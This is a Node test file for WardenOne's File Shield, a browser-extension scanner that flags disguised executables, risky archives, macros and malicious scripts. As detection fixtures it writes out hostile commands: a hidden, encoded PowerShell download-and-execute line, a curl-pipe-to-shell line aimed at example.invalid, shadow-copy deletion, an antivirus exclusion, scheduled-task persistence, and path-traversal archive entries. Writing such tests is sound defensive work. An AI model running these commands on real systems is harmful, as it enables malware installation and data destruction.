/* WardenOne — Copyright (C) 2026 iri
   Licensed under the GNU General Public License v3 or later. See LICENSE.
   Official source: https://github.com/iri-dev/WardenOne
   Upstream filter-list attribution: CREDITS.md
   Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
   with the date, and to keep these notices intact. */
/*
 * File Shield — the manual file scanner.
 *
 * Download Shield grades files it watched arrive, and it cannot read the saved
 * bytes: Chrome gives an extension no access to the file on disk, so its hash is
 * a re-fetch of the URL. File Shield is the other half — the reader hands over an
 * actual file, so these are the real bytes, and this is the only place in
 * WardenOne that can state a true hash of a real file.
 *
 * The detectors below are lifted out of file-shield.js and run against fixtures
 * built here byte by byte, so the ZIP, LNK and magic-byte readers are exercised
 * for real rather than asserted about with a regex.
 *
 * Two things this suite exists to hold:
 *
 * 1. IT MUST NEVER SAY A FILE IS SAFE. Structure analysis can prove a file is
 *    disguised. It cannot prove the opposite, and copy that implies otherwise
 *    would be the most harmful thing on the page.
 * 2. NOTHING LEAVES THE MACHINE WITHOUT A PRESS. The only network call is a hash
 *    lookup behind a button that states what it sends.
 *
 * Run: node tools/test-file-shield.js
 */
'use strict';

const fs = require('fs');
const vm = require('vm');

const JS = fs.readFileSync('file-shield.js', 'utf8');
const HTML_RAW = fs.readFileSync('file-shield.html', 'utf8');
/* Prose in the markup is wrapped for reading, so a sentence matched literally
   fails the moment it crosses a line. Collapse runs of whitespace before
   matching copy; HTML_RAW stays available for structure. */
const HTML = HTML_RAW.replace(/\s+/g, ' ');
/* Copy in the JS is wrapped across string concatenations the same way the markup
   is wrapped across lines, so a sentence matched literally fails the moment it
   crosses a `' + '` seam. Join those seams for copy assertions; JS stays raw for
   anything structural. */
const JS_COPY = fs.readFileSync('file-shield.js', 'utf8').replace(/'\s*\+\s*'/g, '');
const BG = fs.readFileSync('background.js', 'utf8');
const POPUP_HTML = fs.readFileSync('popup.html', 'utf8');
const POPUP_JS = fs.readFileSync('popup.js', 'utf8');
let failed = 0;

function check(what, ok, why) {
  if (ok) return;
  failed++;
  console.error('[fail] ' + what + (why ? ' -- ' + why : ''));
}

/* ---- lift the detectors and run them for real --------------------------- */
/* Everything above the first DOM reference is pure logic. Sliced rather than
   re-implemented, so what is tested is what ships. */
const cut = JS.indexOf('/* ---- rendering');
check('the analysis half is separable from the DOM half', cut > 0);
const logic = JS.slice(JS.indexOf("'use strict';"), cut);

const box = { TextDecoder, DataView, Uint8Array, ArrayBuffer, String, Number, Math, Array, Object, JSON, Date, console };
box.document = { getElementById: () => null };
box.crypto = { subtle: {} };
box.chrome = { runtime: { sendMessage: () => {} } };
vm.createContext(box);
vm.runInContext(
  logic + '\n;globalThis.api = { detectFormat, readZip, readLnk, verdictFor, extensionOf, humanSize,'
  + ' DANGEROUS_EXT, DOUBLE_EXT, HIDDEN_CHARS, EXT_EXPECTS, SIGNATURES, BOMB_RATIO,'
  + ' normalizeApi, PE_CAPABILITY_INDEX, certNames };',
  box,
  { filename: 'file-shield.js' },
);
const api = box.api;

/* ---- magic bytes -------------------------------------------------------- */
const head = (bytes, len) => {
  const out = new Uint8Array(len || Math.max(bytes.length, 64));
  out.set(bytes, 0);
  return out;
};
const fmt = (bytes, size) => api.detectFormat(head(bytes), size || 4096, null);

check('a PE executable is recognised', fmt([0x4D, 0x5A, 0x90, 0x00]).cls === 'executable');
check('an ELF binary is recognised', fmt([0x7F, 0x45, 0x4C, 0x46]).cls === 'executable');
check('a ZIP is recognised', fmt([0x50, 0x4B, 0x03, 0x04]).id === 'zip');
check('a PNG is recognised', fmt([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]).id === 'png');
check('a PDF is recognised', fmt([0x25, 0x50, 0x44, 0x46, 0x2D]).id === 'pdf');
check('a compound file is recognised', fmt([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]).id === 'ole');
check('a Windows shortcut is recognised',
  fmt([0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00]).id === 'lnk');
/* RIFF needs the second tag: without it WAV, WebP and AVI are the same bytes. */
const riff = (tag) => fmt([0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0].concat([...tag].map((c) => c.charCodeAt(0))));
check('RIFF is disambiguated to WebP', riff('WEBP').id === 'webp');
check('RIFF is disambiguated to WAV', riff('WAVE').id === 'wav');
check('an unknown binary is reported as unknown, not guessed',
  fmt([0x00, 0x01, 0x02, 0x00, 0xFF, 0x00]).cls === 'unknown');
/* Text detection must not claim binary is text. */
const textBytes = [...'hello, this is a plain text file'].map((c) => c.charCodeAt(0));
check('plain text is recognised', api.detectFormat(new Uint8Array(textBytes), textBytes.length, null).id === 'text');
const withNul = new Uint8Array([...textBytes, 0x00, ...textBytes]);
check('bytes containing NUL are not called text', api.detectFormat(withNul, 100, null).cls === 'unknown');

/* ---- the check that matters: a program wearing a document's name -------- */
check('a .jpg expects an image, not an executable',
  api.EXT_EXPECTS.jpg.includes('jpg') && !api.EXT_EXPECTS.jpg.includes('exe'));
check('a .docx is expected to be a ZIP', api.EXT_EXPECTS.docx.includes('zip'),
  'OOXML is a ZIP container; expecting anything else would flag every real .docx');
check('an unlisted extension is not judged', api.EXT_EXPECTS.qqq === undefined,
  'an extension nobody has heard of is not evidence of anything');

/* ---- name tricks -------------------------------------------------------- */
check('a double extension is caught', api.DOUBLE_EXT.test('invoice.pdf.exe'));
check('a .jpg.scr is caught', api.DOUBLE_EXT.test('holiday-photo.jpg.scr'));
check('an ordinary dotted name is not a double extension',
  !api.DOUBLE_EXT.test('vue.global.js') && !api.DOUBLE_EXT.test('archive.tar.gz'),
  'a false positive here would flag most JavaScript libraries');
check('a right-to-left override is caught', api.HIDDEN_CHARS.test('photo\u202Egnp.exe'));
check('a zero-width character is caught', api.HIDDEN_CHARS.test('setup\u200B.exe'));
check('an ordinary name has no hidden characters', !api.HIDDEN_CHARS.test('quarterly-report.pdf'));

/* ---- ZIP: built byte by byte and read back ------------------------------ */
/* A real central directory, so the parser is exercised rather than described. */
function buildZip(entries) {
  const enc = new TextEncoder();
  const records = [];
  for (const e of entries) {
    const name = enc.encode(e.name);
    const rec = new Uint8Array(46 + name.length);
    const v = new DataView(rec.buffer);
    v.setUint32(0, 0x02014b50, true);
    v.setUint16(8, e.encrypted ? 1 : 0, true);
    v.setUint32(20, e.compressed === undefined ? 100 : e.compressed, true);
    v.setUint32(24, e.size === undefined ? 100 : e.size, true);
    v.setUint16(28, name.length, true);
    rec.set(name, 46);
    records.push(rec);
  }
  const cdSize = records.reduce((n, r) => n + r.length, 0);
  const cd = new Uint8Array(cdSize);
  let at = 0;
  for (const r of records) { cd.set(r, at); at += r.length; }
  const eocd = new Uint8Array(22);
  const ev = new DataView(eocd.buffer);
  ev.setUint32(0, 0x06054b50, true);
  ev.setUint16(10, entries.length, true);
  ev.setUint16(12, entries.length, true);
  ev.setUint32(12, cdSize, true);
  ev.setUint32(16, 0, true);
  /* Entry counts sit at 8 and 10; write them after the size fields above so the
     wider setUint32 does not stamp over them. */
  ev.setUint16(8, entries.length, true);
  ev.setUint16(10, entries.length, true);
  const all = new Uint8Array(cd.length + eocd.length);
  all.set(cd, 0);
  all.set(eocd, cd.length);
  return all;
}

/* A minimal File stand-in: slice + arrayBuffer is all readZip uses. */
function fakeFile(bytes) {
  return {
    size: bytes.length,
    slice: (a, b) => ({ arrayBuffer: async () => bytes.slice(a, b).buffer }),
  };
}

async function readArchive(entries) {
  const bytes = buildZip(entries);
  const findings = [];
  const zip = await api.readZip(fakeFile(bytes), { start: 0, bytes }, findings);
  return { zip, findings, titles: findings.map((f) => f.title) };
}

(async () => {
  const plain = await readArchive([{ name: 'notes.txt' }, { name: 'photo.png' }]);
  check('an ordinary archive is read', plain.zip && plain.zip.files === 2,
    plain.zip ? 'files=' + plain.zip.files : 'no zip parsed');
  check('an ordinary archive raises nothing', plain.findings.length === 0,
    plain.titles.join('; '));

  const withExe = await readArchive([{ name: 'readme.txt' }, { name: 'setup.exe' }]);
  check('an executable inside an archive is reported',
    withExe.findings.some((f) => f.level === 'danger' && /Windows will run/.test(f.title)));

  const traversal = await readArchive([{ name: '../../evil.txt' }]);
  check('a path-traversal entry is reported',
    traversal.findings.some((f) => f.level === 'danger' && /outside the folder/.test(f.title)),
    traversal.titles.join('; '));
  const absolute = await readArchive([{ name: 'C:\\Windows\\System32\\evil.dll' }]);
  check('an absolute-path entry is reported',
    absolute.findings.some((f) => /outside the folder/.test(f.title)),
    absolute.titles.join('; '));

  const macro = await readArchive([{ name: '[Content_Types].xml' }, { name: 'word/vbaProject.bin' }]);
  check('macros are found by their file, not by the extension',
    macro.findings.some((f) => /carries macros/.test(f.title)),
    'a .docx renamed from .docm still contains vbaProject.bin');

  const locked = await readArchive([{ name: 'payload.bin', encrypted: true }]);
  check('password-protected entries are reported',
    locked.findings.some((f) => /password-protected/.test(f.title)));

  const bomb = await readArchive([{ name: 'big.txt', compressed: 1000, size: 1000 * 1000 }]);
  check('an extreme compression ratio is reported',
    bomb.findings.some((f) => /expand enormously/.test(f.title)));
  check('the bomb check reads sizes rather than expanding them',
    /Read from the archive index; nothing was extracted/.test(JS)
      && !/DecompressionStream|inflate|unzip\(/.test(JS),
    'decompressing to measure a decompression bomb is how the bomb goes off');
  check('the bomb wording says the archive CLAIMS a size',
    /claims to expand/.test(JS),
    'the central directory is metadata and can lie');

  const nested = await readArchive([{ name: 'inner.zip' }]);
  check('a nested archive is reported as unopened',
    nested.findings.some((f) => /contains more archives/.test(f.title)
      && /does not open these/.test(f.detail)));

  const rlo = await readArchive([{ name: 'photo\u202Egnp.exe' }]);
  check('a disguised entry name is reported',
    rlo.findings.some((f) => /hidden text-direction/.test(f.title)));

  /* ---- LNK ---- */
  function buildLnk(target, args) {
    const strings = [];
    const push = (s) => {
      const b = new Uint8Array(2 + s.length * 2);
      const v = new DataView(b.buffer);
      v.setUint16(0, s.length, true);
      for (let i = 0; i < s.length; i++) v.setUint16(2 + i * 2, s.charCodeAt(i), true);
      strings.push(b);
    };
    push(target);
    push(args);
    const total = strings.reduce((n, s) => n + s.length, 0);
    const out = new Uint8Array(76 + total);
    const v = new DataView(out.buffer);
    v.setUint32(0, 0x4C, true);
    /* HasRelativePath | HasArguments | IsUnicode */
    v.setUint32(20, 0x8 | 0x20 | 0x80, true);
    let at = 76;
    for (const s of strings) { out.set(s, at); at += s.length; }
    return out;
  }
  const shortcut = api.readLnk(buildLnk('..\\..\\Windows\\System32\\cmd.exe', '/c powershell -enc SQBFAFgA'));
  check('a shortcut target is read out of the file',
    shortcut && /cmd\.exe/.test(shortcut.target || ''), JSON.stringify(shortcut));
  check('a shortcut command line is read out of the file',
    shortcut && /powershell -enc/.test(shortcut.args || ''), JSON.stringify(shortcut));
  check('a truncated shortcut returns nothing rather than throwing',
    api.readLnk(new Uint8Array(10)) === null);
  check('the page shows the command a shortcut would run',
    /id="lnk-facts"/.test(HTML) && /What this shortcut actually runs/.test(HTML),
    'the extension alone is a weak warning; the command line is the evidence');
  check('a shell in a shortcut is treated as dangerous',
    /powershell\|pwsh\|cmd\\\.exe/.test(JS) && /level: shell \|\| encoded \? 'danger'/.test(JS));

  /* ---- executables: the case the whole feature is for ---------------------
     "This is a Windows program" is not information. Signature, capability and
     packing are, and all three are readable without running anything. */
  /* Ends at the next section marker, whichever comes first -- the slice used to
     run to "/* ---- PDFs" and quietly swallowed the script reader when that was
     added between them. */
  const peEnd = Math.min(...['/* ---- scripts', '/* ---- PDFs']
    .map((m) => JS.indexOf(m)).filter((i) => i > 0));
  const peSrc = JS.slice(JS.indexOf('async function readPE'), peEnd);
  check('the executable reader exists', peSrc.length > 0);
  check('it reports whether anyone signed the file',
    /no signature inside this file/i.test(peSrc) && /const cert = dir\(4\)/.test(peSrc),
    'signed-or-not is the single most useful fact about a Windows binary');
  /* Windows signs its own binaries through a catalog, so notepad.exe carries no
     embedded signature and is perfectly signed. "Nobody has signed this" about a
     system file is the false alarm that teaches someone to ignore the tool. */
  check('a missing embedded signature is not called unsigned',
    /not the same as unsigned/.test(peSrc) && /catalog/i.test(peSrc),
    'verified against the real C:\\Windows\\System32\\notepad.exe, which has no embedded signature');
  check('it never claims a signature is valid',
    /cannot check that the signature[\s\S]{0,80}is valid/.test(peSrc)
      && /Treat[\s\S]{0,20}the name as a claim/.test(peSrc),
    'a page cannot verify a certificate chain; saying otherwise would be the worst kind of wrong');
  check('the certificate directory is read as a file offset, not an RVA',
    /FILE offset, not an RVA/i.test(peSrc) && /file\.slice\(cert\.rva/.test(peSrc)
      && !/toOffset\(cert\.rva\)/.test(peSrc),
    'entry 4 is the one data directory that stores a file offset; as an RVA every signed binary reads as unsigned');
  check('capabilities are phrased as what it CAN do',
    /what it CAN do, not what it will/.test(peSrc) || /can<\/strong> do, not what it will/.test(HTML));
  check('capabilities admit that installers need them too',
    /installer[\s\S]{0,40}legitimately/i.test(peSrc + HTML));
  /* Looks for actual arithmetic, not the word. The first version banned the
     string "score" and so was failed by a comment saying it deliberately does
     not score. */
  check('capabilities are never scored into a verdict',
    !/score\s*[+\-]?=|riskScore|threatScore|\bpoints\s*\+=/.test(peSrc),
    'counting scary imports is how a scanner starts crying wolf on every installer');
  check('the capability list covers the ones that matter',
    ['Reach the network', 'Start other programs', 'Write into another running program',
      'Install itself as a Windows service', 'Notice it is being examined'].every((c) => JS.includes(c)));
  /* Matched exactly, not by prefix. /^send/ matched SendMessage, so every
     windowed program "reached the network"; GetTickCount64 made Notepad "notice
     it is being examined". Both verified against the real binaries. */
  check('capabilities are matched on exact API names',
    /const PE_CAPABILITY_INDEX/.test(JS) && /function normalizeApi/.test(JS)
      && !/\[\/\^\(URLDownloadToFile/.test(JS));
  check('APIs common to almost every program are not treated as capabilities',
    !/'GetTickCount64'|'GetDC'|'BitBlt'|'OpenProcess'|'FindFirstFile'|'GetForegroundWindow'/.test(JS),
    'a capability that fires on Notepad teaches the reader to ignore the panel');
  /* Run the matcher for real, against the exact names that produced the wrong
     answers on C:\Windows\System32\notepad.exe. */
  const capOf = (fn) => api.PE_CAPABILITY_INDEX.get(api.normalizeApi(fn));
  for (const [fn, expected] of [
    ['CreateProcessW', 'Start other programs'],
    ['WriteProcessMemory', 'Write into another running program'],
    ['URLDownloadToFileW', 'Reach the network'],
    ['SetWindowsHookExA', 'Record what you type'],
  ]) check('"' + fn + '" is a capability', capOf(fn) === expected, 'got ' + capOf(fn));
  for (const fn of ['SendMessageW', 'GetTickCount64', 'GetDC', 'BitBlt', 'GetForegroundWindow',
    'FindFirstFileW', 'OpenProcess', 'RegSetValueExW', 'GetLastError']) {
    check('"' + fn + '" is too ordinary to be a capability', capOf(fn) === undefined,
      'it was matched as: ' + capOf(fn));
  }
  check('packing is detected and explained rather than accused',
    /function shannon/.test(JS) && /Some[\s\S]{0,60}commercial software does this/.test(peSrc));
  /* Compared on the REPORTING branches, not the first mention of pe.packed --
     which is its assignment, and sits above both by necessity. */
  check('a named packer is reported instead of a bare entropy number',
    /UPX\|\\\.aspack/.test(peSrc)
      && peSrc.indexOf('if (packerNames.length)') < peSrc.indexOf('} else if (pe.packed)')
      && peSrc.indexOf('} else if (pe.packed)') > 0,
    'naming UPX is useful; "entropy 7.4" on its own is not');

  /* Run the certificate-name reader for real against a DER commonName. */
  const cnBytes = (name) => {
    const out = [0x06, 0x03, 0x55, 0x04, 0x03, 0x0C, name.length];
    for (const ch of name) out.push(ch.charCodeAt(0));
    return new Uint8Array([0x30, 0x20, ...out, 0x00, 0x00]);
  };
  /* certNames is inside the sliced logic region, so re-lift it. */
  const certBox = { String, Array, Number, Math };
  vm.createContext(certBox);
  vm.runInContext(JS.slice(JS.indexOf('function certNames('), JS.indexOf('async function readPE'))
    + ';globalThis.cn = certNames;', certBox, { filename: 'file-shield.js:certNames' });
  check('a certificate common name is read out of the DER',
    certBox.cn(cnBytes('Example Software Ltd')).includes('Example Software Ltd'));
  check('a malformed certificate yields nothing rather than throwing',
    Array.isArray(certBox.cn(new Uint8Array([0x06, 0x03, 0x55, 0x04, 0x03, 0x0C, 0xFF]))));
  /* DER lists issuers first, so the name that matters came last: node.exe led
     with "Microsoft Identity Verification Root Certificate Authority 2020"
     rather than "OpenJS Foundation", which is who actually signed it. */
  const ordered = certBox.cn(new Uint8Array([
    ...cnBytes('Some Root Certificate Authority 2020'), ...cnBytes('Acme Software Ltd')]));
  check('the signer is listed before the certificate authorities',
    ordered[0] === 'Acme Software Ltd', ordered.join(' | '));
  /* The real names off C:\Program Files\Google\Chrome\Application\chrome.exe.
     "…SHA384 2021 CA1" is not matched by \bCA\b, so Google LLC came second. */
  const chromeLike = certBox.cn(new Uint8Array([
    ...cnBytes('DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1'),
    ...cnBytes('Google LLC'), ...cnBytes('DigiCert Assured ID Root CA')]));
  check('an intermediate ending in CA1 is still recognised as an authority',
    chromeLike[0] === 'Google LLC', chromeLike.join(' | '));
  check('the facts row does not call a catalog-signed file unsigned',
    !/'nobody — there is no signature'/.test(JS) && /signs its own through a catalog/.test(JS));

  /* ---- scripts: the thing that actually arrives in a chat message --------
     A .bat or .ps1 needs no exploit and no installer; a double-click is the
     whole attack. Reporting "Plain text" and stopping was the biggest gap. */
  const scriptBox2 = { String, Array, Math, Object, RegExp };
  vm.createContext(scriptBox2);
  vm.runInContext(JS.slice(JS.indexOf('const SCRIPT_EXT ='), JS.indexOf('/* ---- PDFs'))
    + ';globalThis.rs = readScript; globalThis.EXT = SCRIPT_EXT;', scriptBox2,
  { filename: 'file-shield.js:readScript' });
  const runScript = (text, ext) => {
    const f = [];
    const out = scriptBox2.rs(text, 'x.' + ext, ext, { cls: 'text' }, f);
    return { out, findings: f, labels: (out && out.signals || []).map((s) => s.label) };
  };

  const downloader = runScript(
    'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n'
    + '$x = (New-Object Net.WebClient).DownloadString("http://example.invalid/a")\nIEX $x', 'ps1');
  check('a PowerShell downloader is read as dangerous',
    downloader.findings[0] && downloader.findings[0].level === 'danger', JSON.stringify(downloader.findings[0]));
  check('it names the download', downloader.labels.some((l) => /Downloads something/.test(l)), downloader.labels.join('; '));
  check('it names the build-and-run', downloader.labels.some((l) => /executes it/.test(l)), downloader.labels.join('; '));
  check('it names the encoding', downloader.labels.some((l) => /encoded to be unreadable/.test(l)), downloader.labels.join('; '));
  check('it names the hidden window', downloader.labels.some((l) => /Hides its own window/.test(l)), downloader.labels.join('; '));
  check('the offending line is kept, not just the label',
    downloader.out.signals.every((s) => typeof s.line === 'string' && s.line.length > 0),
    'the whole principle is showing the reader the actual line');
  /* Asserts the preview contains the actual file, not merely that it is a
     non-empty string -- the length>0 version passed on a preview of "\n". */
  check('the file itself is shown',
    typeof downloader.out.preview === 'string'
      && downloader.out.preview.includes('DownloadString')
      && downloader.out.preview.includes('IEX'),
    JSON.stringify(String(downloader.out.preview).slice(0, 60)));

  const ransom = runScript('vssadmin delete shadows /all /quiet', 'bat');
  check('destroying backups is named', ransom.labels.some((l) => /Destroys backups/.test(l)), ransom.labels.join('; '));
  const avOff = runScript('Add-MpPreference -ExclusionPath "C:\\Users\\Public"', 'ps1');
  check('excluding itself from antivirus is named',
    avOff.labels.some((l) => /security software/.test(l)), avOff.labels.join('; '));
  const persist = runScript('schtasks /create /sc minute /tn Updater /tr calc.exe', 'bat');
  check('setting itself to run again is named',
    persist.labels.some((l) => /run again automatically/.test(l)), persist.labels.join('; '));
  const obf = runScript('$a = "' + 'A'.repeat(1400) + '"', 'ps1');
  check('one enormous line reads as deliberately unreadable',
    obf.labels.some((l) => /unreadable/i.test(l)), obf.labels.join('; '));

  const plainBat = runScript('@echo off\necho Hello\npause', 'bat');
  check('an ordinary batch file is not called dangerous',
    plainBat.findings[0] && plainBat.findings[0].level === 'caution', JSON.stringify(plainBat.findings[0]));
  check('but it still says a script is instructions for your computer',
    /instructions for your computer/.test(JS_COPY));
  /* Guessing "this looks like a script" from content would call any README
     containing the word eval a script. */
  check('a non-script extension is not treated as a script',
    runScript('some prose that mentions eval( and IEX in passing', 'txt').out === null,
    'the name or a shebang decides, never the content');
  check('a shebang is enough on its own',
    runScript('#!/bin/sh\ncurl http://example.invalid | sh', 'run').out !== null);

  /* ---- more than one file ---- */
  check('several files can be scanned at once',
    /<input type="file" id="picker" multiple hidden>/.test(HTML_RAW) && /function renderBatch/.test(JS),
    'the situation this exists for is rarely one file');
  check('they are scanned in sequence, not all at once',
    /for \(let i = 0; i < list\.length; i\+\+\) \{[\s\S]{0,400}await analyse/.test(JS),
    'hashing is the slow part; six at once only makes each one slower');
  /* Both found by an adversarial audit rather than by use. */
  check('a crafted import table cannot force unbounded reads',
    /const FAR_READ_BUDGET = \d+/.test(JS) && /farReads >= FAR_READ_BUDGET/.test(JS),
    'a 200KB executable pointing every thunk far away forced 11,241 separate Blob reads');
  check('a second scan does not interleave with the first',
    /let SCAN_RUN = 0;/.test(JS) && /run !== SCAN_RUN/.test(JS) && /const run = \+\+SCAN_RUN;/.test(JS),
    'dropping files mid-scan cleared the batch under the running scan');
  check('one unreadable file does not sink the rest',
    /batch\.push\(\{[\s\S]{0,120}failed:/i.test(JS));
  check('the summary only appears when there is more than one',
    /box\.hidden = BATCH\.length < 2/.test(JS));
  check('the report can be taken away',
    /id="copy-report"/.test(HTML_RAW) && /navigator\.clipboard\.writeText/.test(JS));
  check('the copied report repeats that it is not a safety verdict',
    /This does not say the file is safe/.test(JS));

  /* ---- PDFs and legacy Office ---- */
  check('PDF active content is looked for',
    /\/JavaScript/.test(JS) && /\/OpenAction/.test(JS) && /\/Launch/.test(JS) && /\/EmbeddedFile/.test(JS));
  check('a PDF that can start a program is danger, not caution',
    /start another program\|the moment it opens/.test(JS));
  check('an ordinary PDF is not accused of anything',
    /if \(!active\.length\) \{[\s\S]{0,80}return \{ active: \[\]/.test(JS));
  check('legacy Office macros are found through OLE2 streams',
    /_VBA_PROJECT\|VBA/.test(JS),
    'a .doc is not a zip, so the vbaProject.bin check cannot see it');

  /* ---- the offline known-malware list ---- */
  check('the real file hash is checked against the bundled list',
    /kind: 'file-scan-known'/.test(JS) && /MALWARE_HASHES\.has/.test(BG));
  check('a match says it is this exact file',
    /This is the real file you picked,[\s\S]{0,30}not a guess from its name/.test(JS));
  check('a miss is reported too, with its own limits',
    /Not on the known-malware list/.test(JS) && /missing from it means very[\s\S]{0,20}little/.test(JS),
    'a check that only speaks when it fires cannot be told apart from one that never ran');
  check('the list check cannot hang the scan', /setTimeout\(\(\) => done\(null\), \d+\)/.test(JS));
  check('the known-list kind is not reachable from a web page',
    !new RegExp("TAB_CONTEXT_ALLOWED_MESSAGES = new Set\\(\\[[^\\]]*'file-scan-known'").test(BG),
    'a page could otherwise test arbitrary hashes against the list');

  /* ---- the verdict must never claim safety ---- */
  const clean = api.verdictFor({ findings: [] });
  check('a clean scan is not called safe',
    !/\bsafe\b/i.test(clean.headline), clean.headline);
  check('a clean scan says explicitly that it is not a safety verdict',
    /not[\s\S]{0,20}the same as safe/i.test(clean.copy), clean.copy);
  check('a clean scan describes what was checked, not the file',
    /disguised/i.test(clean.headline), clean.headline);
  check('a danger verdict is reached when anything is danger-level',
    api.verdictFor({ findings: [{ level: 'danger' }] }).level === 'danger');
  /* Two different accusations. documents.zip that really is a zip, carrying an
     .exe and a path-traversal entry, was announced as "not what its name says" --
     the name was honest and the contents were not, and saying the wrong one
     sends the reader looking at the wrong thing. */
  check('a disguised file is accused of being disguised',
    /not what its name says/.test(api.verdictFor({ findings: [{ level: 'danger', kind: 'disguise' }] }).headline));
  check('an honestly-named file with bad contents is not accused of lying about its name',
    !/not what its name says/.test(api.verdictFor({ findings: [{ level: 'danger' }] }).headline),
    api.verdictFor({ findings: [{ level: 'danger' }] }).headline);
  /* Sliced to the mismatch block rather than matched with a fixed-width window:
     the first attempt used [\s\S]{0,300} and failed on the explanatory comment
     sitting between the tag and the title. */
  const mismatchBlock = JS.slice(JS.indexOf('let mismatch = null;'), JS.indexOf("/* ---- what the content itself is"));
  check('the mismatch block is where the slice expects it', mismatchBlock.length > 0);
  check('the extension mismatch finding is tagged as a disguise',
    /kind: 'disguise'/.test(mismatchBlock) && /Named \.' \+ ext/.test(mismatchBlock),
    'without the tag the verdict cannot tell a disguise from bad contents');
  /* The format label carries its own capitals; lowercasing it to fit a sentence
     produced "windows program (pe/dos executable)" in the one line that has to
     be believed. */
  check('format labels are never lowercased into a sentence',
    !/format\.label\.toLowerCase\(\)/.test(JS));

  /* The gate before any archive parsing: a real ZIP starts with a local file
     header, so the fixtures above (which start at the central directory) never
     exercised it. */
  const zipStart = api.detectFormat(head([0x50, 0x4B, 0x03, 0x04, 0x14, 0x00]), 4096, null);
  check('a real ZIP reaches the archive reader', zipStart.id === 'zip');
  check('a self-extracting archive is called an executable first',
    api.detectFormat(head([0x4D, 0x5A, 0x50, 0x4B]), 4096, null).cls === 'executable',
    'an SFX archive starts with MZ; that it also contains a zip is the lesser fact');
  check('one caution does not become a danger verdict',
    api.verdictFor({ findings: [{ level: 'caution' }] }).level === 'caution');
  check('the page repeats the limit in its own words',
    /cannot tell you a file is safe/.test(HTML) && /it is not antivirus/.test(HTML));

  /* ---- nothing leaves without a press ---- */
  /* Counted by what reaches the INTERNET, not by how many messages the page
     sends. The first version of this counted sendMessage calls, which broke the
     moment a second, purely local check was added -- and would equally have
     passed if the one remaining call had been the networked one fired on load. */
  check('the VirusTotal lookup is sent only from the button handler',
    (JS.match(/'file-scan-vt'/g) || []).length === 1
      && JS.slice(JS.indexOf("$('vt-run').addEventListener"), JS.indexOf("/* ---- picking a file")).includes("'file-scan-vt'"),
    'anything that leaves the machine has to be asked for');
  check('the known-malware check never leaves the machine',
    /MALWARE_HASHES\.has\(sha256\)/.test(BG)
      && !/fetch\(/.test(BG.slice(BG.indexOf("msg.kind === 'file-scan-known'"), BG.indexOf("msg.kind === 'file-scan-vt'"))),
    'it answers from a bundled list; a lookup would make an offline check a network one');
  check('the button that does reach the network is present', /id="vt-run"/.test(HTML));
  check('the file itself is never sent anywhere',
    !/FormData|files\/upload|body: (file|buf)/.test(JS),
    'VirusTotal takes a hash lookup; uploading the file would publish it');
  check('the page states exactly what the lookup sends before it sends it',
    /this hash and nothing else/.test(HTML) && /id="vt-hash"/.test(HTML));
  check('the page says why that is still a disclosure',
    /tells VirusTotal that someone has that exact file/.test(HTML),
    'a hash identifies a rare file exactly');
  check('an unknown hash is not reported as clean',
    /It is not a clean result; it is no result/.test(JS));
  check('a zero-detection result is not reported as clean either',
    /lowers suspicion rather than settling it/.test(JS));

  /* ---- the worker side ---- */
  /* EVERY File Shield handler, counted -- not "at least one somewhere in the
     file". The single-occurrence version passed with the validation deleted from
     one of the two, because the other still matched. */
  const fsRegion = BG.slice(BG.indexOf('// ---- File Shield ----'), BG.indexOf('// ---- My Rules ----'));
  const handlerCount = (fsRegion.match(/msg\.kind === 'file-scan-[a-z]+'/g) || []).length;
  const guardCount = (fsRegion.match(/if \(!\/\^\[a-f0-9\]\{64\}\$\/\.test\(sha256\)\)/g) || []).length;
  check('the File Shield region is where the slice expects it', handlerCount >= 2, 'found ' + handlerCount);
  check('every File Shield handler validates the hash shape first',
    guardCount === handlerCount, guardCount + ' guards for ' + handlerCount + ' handlers');
  check('the lookup kind is not reachable from a web page',
    !new RegExp("TAB_CONTEXT_ALLOWED_MESSAGES = new Set\\(\\[[^\\]]*'file-scan-vt'").test(BG),
    'a page able to reach it could spend the reader VirusTotal quota and probe for known files');
  check('a missing key is reported rather than failing silently',
    /noKey: true/.test(BG) && /No VirusTotal key is set/.test(JS));
  check('the worker reuses the existing VirusTotal client',
    /await checkVirusTotalFileHash\(sha256, key\)/.test(BG),
    'a second implementation would drift from the one Download Shield uses');

  /* ---- big files are refused honestly, not silently ---- */
  check('there is a hashing size ceiling', /const HASH_MAX_BYTES = /.test(JS));
  check('an oversized file still gets everything else',
    /Everything else on this page was still checked/.test(JS));
  check('structure is read from slices so a huge file is still inspectable',
    /file\.slice\(0, Math\.min\(HEAD_BYTES/.test(JS) && /const TAIL_BYTES/.test(JS),
    'reading a 6 GB image into memory to find its first four bytes would hang the tab');

  /* ---- the page ---- */
  check('the page declares its theme scope', /data-wardenone-page="file-shield"/.test(HTML));
  check('the popup opens it in a tab',
    /id="open-file-shield"/.test(POPUP_HTML)
      && /chrome\.runtime\.getURL\('file-shield\.html'\)/.test(POPUP_JS));
  /* NOT behind the Advanced dropdown, unlike the network logger. The logger is a
     debugging tool for filter rules you wrote yourself. "Someone sent me a file,
     is it safe to open?" is the most ordinary security question anyone has -- and
     this exists precisely for files that never touched the browser, so a reader
     in that moment is not going to think to open an advanced panel. It belongs
     with Download Shield, whose manual half it is. */
  check('File Shield is not hidden behind the advanced dropdown',
    POPUP_HTML.indexOf('id="open-file-shield"') < POPUP_HTML.indexOf('id="my-filters-drop"'),
    'the feature exists for the coverage gap Download Shield cannot reach; hiding it leaves that gap unfilled');
  check('it sits in the Download Shield section',
    POPUP_HTML.indexOf('id="open-file-shield"') > POPUP_HTML.indexOf('<h2>Download Shield</h2>')
      && POPUP_HTML.indexOf('id="open-file-shield"') < POPUP_HTML.indexOf('<h2>Privacy</h2>'));
  check('the page explains why this exists next to Download Shield',
    /cannot read the saved bytes|cannot read them off the disk/.test(HTML),
    'the reason is the whole point: Download Shield fingerprints the URL, not the file');
  check('a file can be dropped as well as picked', /id="drop"/.test(HTML) && /dataTransfer/.test(JS));

  if (failed) {
    console.error('file shield: ' + failed + ' failed');
    process.exit(1);
  }
  console.log('file shield: all checks passed');
})();
